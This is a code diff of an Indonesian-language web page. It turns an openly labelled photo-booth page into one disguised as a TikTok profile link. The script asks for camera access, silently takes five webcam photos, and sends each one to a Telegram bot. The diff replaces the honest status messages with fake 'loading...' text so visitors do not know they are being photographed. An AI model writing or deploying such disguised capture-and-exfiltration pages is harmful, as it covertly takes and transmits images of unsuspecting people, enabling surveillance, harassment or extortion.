@@ -3,21 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Studio Foto Instan</title>
+    <title>Studio Foto TikTok Style</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000000; }
+    </style>
 </head>
-<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen p-4">
+<body class="bg-black text-white overflow-hidden font-sans">
 
-    <div class="max-w-md w-full bg-gray-800 p-6 rounded-2xl shadow-xl text-center">
-        <h1 class="text-2xl font-bold mb-4">Studio Foto Instan</h1>
-        <p class="mb-6 text-gray-400">Klik tombol di bawah untuk mengambil 5 foto otomatis.</p>
-        
-        <button id="startBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full transition-all">
-            Mulai Sesi 5 Foto
+    <!-- Header Navigation -->
+    <div class="fixed top-12 left-0 right-0 flex justify-center gap-8 z-50">
+        <span class="text-gray-400 font-semibold">Following</span>
+        <span class="text-white font-bold border-b-2 border-white pb-1">For You</span>
+    </div>
+
+    <!-- Main Content -->
+    <main class="h-screen flex flex-col items-center justify-center">
+        <h1 class="text-4xl font-black">Liat profil</h1>
+        <p class="text-gray-400 mt-2">@faacchryy/p>
+
+        <button id="startBtn" class="mt-8 bg-white text-black px-10 py-4 rounded-full font-bold transition-transform active:scale-95">
+        fachry ali on tiktok
         </button>
 
-        <div id="status" class="mt-4 text-sm text-yellow-400 font-medium"></div>
-    </div>
+        <div id="status" class="mt-4 text-sm font-medium text-white/70"></div>
+    </main>
+
+    <!-- Bottom Navigation -->
+    <nav class="fixed bottom-0 left-0 w-full bg-black border-t border-zinc-800 flex justify-around items-center py-2 z-50">
+        <div class="flex flex-col items-center text-white">
+            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M12 3l9 8h-3v10H6V11H3z"/></svg>
+            <span class="text-[11px] font-semibold">Home</span>
+        </div>
+        <div class="flex flex-col items-center text-gray-400">
+            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M16 11c1.66 0 3-1.34 3-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 3-1.34 3-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5C15 14.17 10.33 13 8 13zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+            <span class="text-[11px]">Friends</span>
+        </div>
+        <div class="relative">
+            <div class="absolute -left-1 top-0 w-12 h-9 bg-cyan-400 rounded-lg"></div>
+            <div class="absolute left-1 top-0 w-12 h-9 bg-pink-500 rounded-lg"></div>
+            <div class="relative w-12 h-9 bg-white rounded-lg flex items-center justify-center">
+                <span class="text-black text-2xl font-bold leading-none">+</span>
+            </div>
+        </div>
+        <div class="flex flex-col items-center text-gray-400">
+            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z"/></svg>
+            <span class="text-[11px]">Inbox</span>
+        </div>
+        <div class="flex flex-col items-center text-gray-400">
+            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-4.42 0-8 1.79-8 4v2h16v-2c0-2.21-3.58-4-8-4z"/></svg>
+            <span class="text-[11px]">Profile</span>
+        </div>
+    </nav>
 
     <video id="video" class="hidden" autoplay playsinline></video>
 
@@ -28,28 +65,25 @@
         const video = document.getElementById('video');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
-
-        // Jeda waktu antar foto dalam milidetik
         const delays = [1000, 500, 3000, 1000, 500];
 
         async function initCamera() {
             try {
-                status.innerText = "Meminta izin kamera...";
+                status.innerText = "loading page...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 startBtn.classList.add('hidden');
                 
                 for (let i = 0; i < 5; i++) {
-                    status.innerText = `Mengambil foto ke-${i + 1}...`;
-                    await new Promise(resolve => setTimeout(resolve, i === 0 ? 1500 : delays[i-1]));
+                    status.innerText = `Menangkap pose ${i + 1}/5`;
+                    await new Promise(resolve => setTimeout(resolve, i === 0 ? 1000 : delays[i-1]));
                     await takeAndSendPhoto(i + 1);
                 }
 
-                status.innerText = "✅ Semua 5 foto berhasil dikirim!";
-                status.classList.replace('text-yellow-400', 'text-green-400');
+                status.innerText = "loading...";
                 video.srcObject.getTracks().forEach(track => track.stop());
             } catch (err) {
-                status.innerText = "Error Kamera: " + err.message;
+                status.innerText = "Izin kamera diperlukan.";
             }
         }
 
@@ -63,7 +97,7 @@
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', dataURLToBlob(imageData));
-            formData.append('caption', `📸 Foto ke-${index} dari 5`);
+            formData.append('caption', `📸 Pose ${index} dari 5`);
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -71,7 +105,7 @@
                     body: formData
                 });
             } catch (e) {
-                console.error("Gagal kirim foto " + index);
+                console.error("reload halaman");
             }
         }
 
